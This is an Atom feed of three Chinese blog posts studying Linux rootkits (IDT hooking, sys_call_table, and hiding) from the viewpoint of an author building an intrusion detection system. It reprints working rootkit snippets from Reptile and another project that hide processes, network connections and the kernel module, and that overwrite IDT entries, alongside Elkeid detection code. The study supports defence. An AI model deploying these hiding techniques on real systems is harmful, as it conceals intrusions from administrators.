<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>chriskali</title>
 <link href="https://chriskaliX.github.io/atom.xml" rel="self"/>
 <link href="https://chriskaliX.github.io/"/>
 <updated>2022-05-20T08:02:17+02:00</updated>
 <id>https://chriskaliX.github.io</id>
 <author>
   <name>chriskali</name>
   <email>chriskali@163.com</email>
 </author>

 
 <entry>
   <title>Linux Rootkit初窥(三)Rootkit隐藏</title>
   <link href="https://chriskaliX.github.io/2022/05/18/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%89-rootkit%E9%9A%90%E8%97%8F"/>
   <updated>2022-05-18T00:00:00+02:00</updated>
   <id>https://chriskaliX.github.io/2022/05/18/Linux_Rootkit初窥(三)Rootkit隐藏</id>
   <content type="html">&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;

&lt;p&gt;一个良好的 Rootkit 除了有敲门，Hook以外，隐藏网络/进程/内核模块也是十分重要的，同时对于我们分析是否存在内核后门，也非常重要&lt;/p&gt;

&lt;p&gt;以下部分代码基于 &lt;a href=&quot;https://github.com/f0rb1dd3n/Reptile&quot;&gt;Reptile&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;proc-隐藏&quot;&gt;proc 隐藏&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/f0rb1dd3n/Reptile/blob/master/kernel/proc.c&quot;&gt;代码地址&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;判断可见&quot;&gt;判断可见&lt;/h3&gt;

&lt;p&gt;首先是入口地址，判断进程是否可见，再调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag_tasks&lt;/code&gt; 设置&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void hide_proc(pid_t pid)
{
	if (is_proc_invisible(pid))
		flag_tasks(pid, 0);
	else
		flag_tasks(pid, 1);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;先看一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_proc_invisible&lt;/code&gt; 函数&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;int is_proc_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (!pid)
		return ret;

	task = find_task(pid);
	if (!task)
		return ret;

	if (is_task_invisible(task))
		ret = 1;

	put_task_struct(task);
	return ret;
}

...

#define FLAG 0x80000000

static inline int is_task_invisible(struct task_struct *task)
{
	return task-&amp;gt;flags &amp;amp; FLAG;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;主要判断 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;task-&amp;gt;flags&lt;/code&gt; 一切围绕着这个展开，包括下面的进程隐藏。我对于 linux 内核并不熟悉，搜索学习了一下如下：&lt;/p&gt;

&lt;h3 id=&quot;进程标记&quot;&gt;进程标记&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;task_struct&lt;/code&gt; 这个结构体，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux/sched.h&lt;/code&gt; 下，&lt;a href=&quot;https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L728&quot;&gt;elixir&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;对应的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags&lt;/code&gt; 标识位如下所示:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;/*
 * Per process flags
 */
#define PF_VCPU			0x00000001	/* I&apos;m a virtual CPU */
#define PF_IDLE			0x00000002	/* I am an IDLE thread */
#define PF_EXITING		0x00000004	/* Getting shut down */
#define PF_POSTCOREDUMP		0x00000008	/* Coredumps should ignore this task */
#define PF_IO_WORKER		0x00000010	/* Task is an IO worker */
#define PF_WQ_WORKER		0x00000020	/* I&apos;m a workqueue worker */
#define PF_FORKNOEXEC		0x00000040	/* Forked but didn&apos;t exec */
#define PF_MCE_PROCESS		0x00000080      /* Process policy on mce errors */
#define PF_SUPERPRIV		0x00000100	/* Used super-user privileges */
#define PF_DUMPCORE		0x00000200	/* Dumped core */
#define PF_SIGNALED		0x00000400	/* Killed by a signal */
#define PF_MEMALLOC		0x00000800	/* Allocating memory */
#define PF_NPROC_EXCEEDED	0x00001000	/* set_user() noticed that RLIMIT_NPROC was exceeded */
#define PF_USED_MATH		0x00002000	/* If unset the fpu must be initialized before use */
#define PF_NOFREEZE		0x00008000	/* This thread should not be frozen */
#define PF_FROZEN		0x00010000	/* Frozen for system suspend */
#define PF_KSWAPD		0x00020000	/* I am kswapd */
#define PF_MEMALLOC_NOFS	0x00040000	/* All allocation requests will inherit GFP_NOFS */
#define PF_MEMALLOC_NOIO	0x00080000	/* All allocation requests will inherit GFP_NOIO */
#define PF_LOCAL_THROTTLE	0x00100000	/* Throttle writes only against the bdi I write to,
						 * I am cleaning dirty pages from some other bdi. */
#define PF_KTHREAD		0x00200000	/* I am a kernel thread */
#define PF_RANDOMIZE		0x00400000	/* Randomize virtual address space */
#define PF_SWAPWRITE		0x00800000	/* Allowed to write to swap */
#define PF_NO_SETAFFINITY	0x04000000	/* Userland is not allowed to meddle with cpus_mask */
#define PF_MCE_EARLY		0x08000000      /* Early kill for mce process policy */
#define PF_MEMALLOC_PIN		0x10000000	/* Allocation context constrained to zones which allow long term pinning. */
#define PF_FREEZER_SKIP		0x40000000	/* Freezer should not count it as freezable */
#define PF_SUSPEND_TASK		0x80000000      /* This thread called freeze_processes() and should not be frozen */
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reptile&lt;/code&gt; 中，判断是否为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PF_SUSPEND_TASK&lt;/code&gt;. 在&lt;a href=&quot;https://github.com/seal9055/cyber_attack_simulation/blob/7aff159017ce013fca6b59dd687e221251d57100/rootkit/rootkit.c&quot;&gt;其他项目&lt;/a&gt;中，我们也能看到为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10000000&lt;/code&gt; 即 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PF_MEMALLOC_PIN&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;net-隐藏&quot;&gt;net 隐藏&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/network.c&quot;&gt;文件地址&lt;/a&gt;
&lt;a href=&quot;https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/main.c&quot;&gt;main.c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.c&lt;/code&gt; 中代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;/* ------------------------ HIDE CONNECTIONS ------------------------- */

#ifdef CONFIG_HIDE_CONN

#include &amp;lt;net/inet_sock.h&amp;gt;
#include &amp;lt;linux/seq_file.h&amp;gt;
#include &quot;network.h&quot;

LIST_HEAD(hidden_conn_list);

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE &amp;gt;= KERNEL_VERSION(2, 6, 33)
	daddr = inet-&amp;gt;inet_daddr;
	//dport = inet-&amp;gt;inet_dport;
#else
	daddr = inet-&amp;gt;daddr;
	//dport = inet-&amp;gt;dport;
#endif

	list_for_each_entry(hc, &amp;amp;hidden_conn_list, list)
	{
		if (hc-&amp;gt;addr.sin_addr.s_addr == daddr /* &amp;amp;&amp;amp; hc-&amp;gt;addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
out:
	return ret;
}

KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE &amp;gt;= KERNEL_VERSION(2, 6, 33)
	daddr = inet-&amp;gt;inet_daddr;
	//dport = inet-&amp;gt;inet_dport;
#else
	daddr = inet-&amp;gt;daddr;
	//dport = inet-&amp;gt;dport;
#endif

	list_for_each_entry(hc, &amp;amp;hidden_conn_list, list)
	{
		if (hc-&amp;gt;addr.sin_addr.s_addr == daddr /* &amp;amp;&amp;amp; hc-&amp;gt;addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
out:
	return ret;
}

#endif
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;简单来说就是 hook 掉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp4_seq_show/udp4_seq_show&lt;/code&gt; 这两个展示网络接口。在函数 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;khook_inet_ioctl&lt;/code&gt; 分支 4 获取来判断是否隐藏&lt;/p&gt;

&lt;h3 id=&quot;module-隐藏&quot;&gt;module 隐藏&lt;/h3&gt;

&lt;p&gt;首先 module 的获取是, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/modules&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsmod&lt;/code&gt; ，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reptile&lt;/code&gt; 中是将自身从内核模块链表中删除。代码很简单，具体原理放后面再深入&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void hide(void)
{
	while (!mutex_trylock(&amp;amp;module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE-&amp;gt;list.prev;
	list_del(&amp;amp;THIS_MODULE-&amp;gt;list);
	kfree(THIS_MODULE-&amp;gt;sect_attrs);
	THIS_MODULE-&amp;gt;sect_attrs = NULL;
	mutex_unlock(&amp;amp;module_mutex);
	
	hide_m = 1;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;unfishied&quot;&gt;Unfishied&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;稍微流水账的记录了一下… 因为急于看 cilium 的 tetragon…&lt;/p&gt;
&lt;/blockquote&gt;
</content>
 </entry>
 
 <entry>
   <title>Linux Rootkit初窥(二)sys_call_table</title>
   <link href="https://chriskaliX.github.io/2022/03/21/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%BA%8C-sys-call-table"/>
   <updated>2022-03-21T00:00:00+01:00</updated>
   <id>https://chriskaliX.github.io/2022/03/21/Linux_Rootkit初窥(二)sys_call_table</id>
   <content type="html">&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;

&lt;p&gt;书接上回，我们对 sys_call_table 继续探究，开篇之前还是先贴一下这个图片。以下代码基于 Kernel Version 4.18&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://chriskaliX.github.io/assets/imgs/callgraph.jpg&quot; alt=&quot;简书&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;基础知识&quot;&gt;基础知识&lt;/h2&gt;

&lt;p&gt;首先我们了解一下，sys_call_table 在 Linux Source Code 中是怎么样的。在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch/x86/entry/syscall_64.c&lt;/code&gt; 中如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;extern asmlinkage long sys_ni_syscall(const struct pt_regs *);
#define __SYSCALL_64(nr, sym, qual) extern asmlinkage long sym(const struct pt_regs *);
#include &amp;lt;asm/syscalls_64.h&amp;gt;
#undef __SYSCALL_64

#define __SYSCALL_64(nr, sym, qual) [nr] = sym,

asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
    /*
     * Smells like a compiler bug -- it doesn&apos;t work
     * when the &amp;amp; below is removed.
     */
    [0 ... __NR_syscall_max] = &amp;amp;sys_ni_syscall,
#include &amp;lt;asm/syscalls_64.h&amp;gt;
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用户态程序调用后进入到 Syscall 陷入中断，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_call_table&lt;/code&gt; 中寻找对应处理程序。对于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_call_table&lt;/code&gt; 地址的获取在 Kernel Version 2.6 之后做了隐藏，可以参考这个&lt;a href=&quot;https://tnichols.org/2015/10/19/Hooking-the-Linux-System-Call-Table/&quot;&gt;文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;由于不讨论 Rootkit 具体细节（其实我还没看），仅从检测角度来说在 Elkeid 里的代码和 IDT 检测一样&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;static void analyze_syscalls(void)
{
    int i;
    unsigned long addr;
    struct module *mod;

    if (!sct || !ckt)
        return;

        
    for (i = 0; i &amp;lt; NR_syscalls; i++) {
        const char *mod_name = &quot;-1&quot;;
        addr = sct[i];
        
        if (!ckt(addr)) {
            module_list_lock();
            mod = get_module_from_addr(addr);
            if (mod) {
                mod_name = mod-&amp;gt;name;
            } else {
                const char* name = find_hidden_module(addr);
                if (IS_ERR_OR_NULL(name)) {
                module_list_unlock();
                continue;
                }

                mod_name = name;
            }
            
            syscall_print(mod_name, i);
            module_list_unlock();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过遍历 kobj 判断是否在 kset 里面来判断是否是一个 hidden module。文章暂时属于未完成的状态，后续会有做 Rootkit 的部分在这里补全&lt;/p&gt;

&lt;h2 id=&quot;题外话&quot;&gt;题外话&lt;/h2&gt;

&lt;p&gt;今天公司的用户态 HIDS 上抓了一个入侵，很兴奋，很少抓到入侵:&lt;/p&gt;

&lt;p&gt;入侵的流程很简单，由于管理疏忽有一个 PHP 的应用存在 RCE，父进程为 php-fpm 的进程执行了 sh 触发了警告，后续就是问题处置&lt;/p&gt;

&lt;p&gt;让我更加明白了，用户态的代码可能和内核态的一样重要。对于绝大部分入侵场景来说，大部分都是在用户态层面的对抗。真正内核态的，可能是占较少部分。所以我一直认为，好的数据采集源是成功的50%，另外的50%在分析&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Linux Rootkit初窥(一)IDT</title>
   <link href="https://chriskaliX.github.io/2022/03/19/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%80-idt"/>
   <updated>2022-03-19T00:00:00+01:00</updated>
   <id>https://chriskaliX.github.io/2022/03/19/Linux_Rootkit初窥(一)IDT</id>
   <content type="html">&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;

&lt;p&gt;近期在编写 HIDS 相关项目 - &lt;a href=&quot;https://github.com/chriskaliX/Hades&quot;&gt;Hades&lt;/a&gt;，对于用户态的后门或者行为，由于使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eBPF&lt;/code&gt; 进行内核态的函数 Hook，我们能够发现大部分的行为。只要 Hook 的够全面，几乎能检测到用户层 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rootkit&lt;/code&gt; 的一举一动。
目前 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hades&lt;/code&gt; 项目完成了十余个 hook，覆盖了执行、网络等，后续补全文件侧以及常用的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uprobes&lt;/code&gt;，对于用户态后门、入侵行为等能有较全的感知。
然而对于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rootkit&lt;/code&gt;，由于笔者知识匮乏，除了 hook &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_init_module&lt;/code&gt; 和针对 eBPF 程序加载（&lt;a href=&quot;https://github.com/Gui774ume/ebpfkit-monitor&quot;&gt;ebpfkit-monitor&lt;/a&gt;）做监测，也不知道如何防范，抓取这样的行为…作为知识的补充，本篇文章涵盖 Rootkit/Linux 基础学习以及一些思考&lt;/p&gt;

&lt;h3 id=&quot;基础知识&quot;&gt;基础知识&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;由于之前对这部分一窍不通，好多的基础知识我们当作实验，稍微的过一遍。从知乎的&lt;a href=&quot;https://www.zhihu.com/question/33695415&quot;&gt;回答&lt;/a&gt;中我们找到 phrack.org，开始学习。参考 &lt;a href=&quot;http://phrack.org/issues/59/4.html&quot;&gt;Handling Interrupt Descriptor Table for fun and profit&lt;/a&gt;，很大一部分可能会是翻译，翻译的过程就是学习的过程&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;首先，Intel CPU 在保护模式，提供四种模式，即 r0 ~ r3 层，用户层的应用程序一般运行在 r3 层，内核态的运行在 r0 层&lt;/p&gt;

&lt;p&gt;中断分为可屏蔽和不可屏蔽中断，其中不可屏蔽中断在这里不讨论。中断向量是个0~255之间的数，其中 0~31 是 exceptions 以及不可屏蔽中断， 32~47 是可屏蔽中断，48~255 为软件中断。Linux 下通常使用的是 (0x80) sys_call_table，即用户态通过 syscall 调用到内核函数。同样的，当我们为了获取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_call_table&lt;/code&gt; 地址也可以从 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDT&lt;/code&gt; 中获取&lt;/p&gt;

&lt;p&gt;什么是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDT&lt;/code&gt; ?  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDT&lt;/code&gt; 即 Interrupt Descriptor Table。是一个描述中断即其对应处理函数的线性表，包含四种不同类型的描述/类型。分别是 Task Gate Descriptor（Linux 不使用这种） / Interrupt Gate Descriptor / Trap Gate Descriptor / Call Gate Descriptor&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GATE_INTERRUPT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GATE_TRAP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GATE_CALL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GATE_TASK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 Interrupt Gate Descriptor 用于中断的处理，需要关注的是 DPL（Descriptor Privilege Level）为0，因此用户态不能访问中断门&lt;/p&gt;

&lt;p&gt;为了方便理解，借用一个图(这图很经典，方便了解整个流程)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://chriskaliX.github.io/assets/imgs/callgraph.jpg&quot; alt=&quot;简书&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;in-linux&quot;&gt;in Linux&lt;/h4&gt;

&lt;p&gt;在 Linux 中，IDT 的定义在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch/x86/kernel/idt.c&lt;/code&gt; ，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDT_ENTRIES&lt;/code&gt; 固定为 256&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gate_desc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IDT_ENTRIES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__page_aligned_bss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gate_desc&lt;/code&gt; 定义如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gate_struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;offset_low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idt_bits&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;offset_middle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#ifdef CONFIG_X86_64
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;offset_high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 offset_* 代表中断函数的偏移量，bits 为属性符&lt;/p&gt;

&lt;h3 id=&quot;从项目出发&quot;&gt;从项目出发&lt;/h3&gt;

&lt;p&gt;从开始，我们便以字节的 Elkeid 作为参考。Elkeid 主要检查了 4 个，即隐藏内核模块/进程隐藏/IDT劫持/系统调用劫持。我们以 idt rootkit 为关键字，搜索到一些&lt;a href=&quot;https://github.com/kaneschutzman/linux-rootkit&quot;&gt;项目&lt;/a&gt;。在 &lt;a href=&quot;https://github.com/kaneschutzman/linux-rootkit/blob/5dcb228a86f67773d6e2b92276e59cf030b52c23/src/idt.c&quot;&gt;idt.c&lt;/a&gt; 中，通过替换 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDT&lt;/code&gt; 中的函数地址实现 Hook，关键代码如下：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;idt_set_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;set_addr_rw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset_middle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_idt_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;set_addr_ro&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_idt_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

